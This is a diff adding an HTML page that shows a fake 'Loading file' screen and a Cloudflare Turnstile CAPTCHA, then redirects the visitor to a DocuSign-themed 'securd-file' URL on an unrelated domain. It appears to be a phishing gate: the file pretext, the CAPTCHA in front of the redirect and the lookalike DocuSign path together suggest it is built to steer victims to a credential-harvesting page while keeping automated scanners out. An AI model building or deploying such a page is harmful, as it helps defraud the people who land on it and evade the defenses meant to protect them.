@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification Required</title>
+
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #74ebd5, #ACB6E5);
+      color: white;
+      text-align: center;
+    }
+
+    .box {
+      padding: 25px;
+      border-radius: 12px;
+      background: rgba(0,0,0,0.25);
+    }
+
+    .spinner {
+      width: 45px;
+      height: 45px;
+      border: 5px solid rgba(255,255,255,0.3);
+      border-top: 5px solid white;
+      border-radius: 50%;
+      margin: 15px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+
+  <script>
+    // Step 1: show loading for 3 seconds
+    setTimeout(function () {
+      document.getElementById("loadingBox").classList.add("hidden");
+      document.getElementById("captchaBox").classList.remove("hidden");
+    }, 3000);
+
+    // Step 2: after CAPTCHA success → redirect
+    function verified() {
+      document.getElementById("captchaBox").classList.add("hidden");
+      document.getElementById("successBox").classList.remove("hidden");
+
+      setTimeout(function () {
+        window.location.href = "https://kmp.za.com/docusign/securd-file";
+      }, 2000);
+    }
+  </script>
+</head>
+
+<body>
+
+  <!-- Loading screen -->
+  <div class="box" id="loadingBox">
+    <h2>Loading file...</h2>
+    <div class="spinner"></div>
+    <p>Please wait</p>
+  </div>
+
+  <!-- CAPTCHA screen -->
+  <div class="box hidden" id="captchaBox">
+    <h2>Verification Required</h2>
+    <p>Complete the check to continue</p>
+
+    <div class="cf-turnstile"
+         data-sitekey="YOUR_SITE_KEY"
+         data-callback="verified"></div>
+  </div>
+
+  <!-- Success screen -->
+  <div class="box hidden" id="successBox">
+    <h2>Verified</h2>
+    <p>Redirecting...</p>
+  </div>
+
+</body>
+</html>
